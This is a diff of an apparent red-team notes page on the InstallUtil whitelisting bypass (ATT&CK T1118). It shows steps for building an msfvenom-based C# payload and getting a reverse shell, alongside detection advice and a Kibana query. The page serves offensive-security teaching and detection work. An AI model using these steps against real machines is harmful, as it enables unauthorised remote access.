@@ -4,7 +4,7 @@ description: InstallUtil code execution - bypass application whitelisting.
 
 # T1118: InstallUtil
 
-## Code
+## Execution
 
 First of, generate a C\# payload \(with [InstalUtil script](https://github.com/khr0x40sh/WhiteListEvasion)\) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:
 
@@ -15,8 +15,6 @@ python InstallUtil.py --cs_file temp.cs --exe_file temp.exe --payload windowsrev
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
-
-## Execution
 
 Compile the .cs to an .exe:
 
@@ -48,7 +46,7 @@ Enjoy the sweet reverse shell:
 
 ## Observations
 
-As per usual, look for InstallUtil processes that have established connections, especially those with cmd or powershell processes running as children - you should treat them as suspicious and investigate the endpoint closer:
+Look for `InstallUtil` processes that have established connections, especially those with cmd or powershell processes running as children - you should treat them as suspicious and investigate the endpoint closer:
 
 ![](../.gitbook/assets/installutil-procexp.png)
 
@@ -69,7 +67,7 @@ event_data.ParentCommandLine:"*installutil.exe*" && event_data.Image:cmd.exe
 What is interesting is that I could not see an established network connection logged in sysmon logs, although I could see other network connections from the victim machine being logged.
 
 {% hint style="danger" %}
-Will be coming back to this one for further inspection.
+Will be coming back to this one for further inspection. Need to review the sysmon configuration.
 {% endhint %}
 
 {% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1118\",\"type\":\"link\",\"title\":\"InstallUtil - ATT&CK for Enterprise\"}" %}
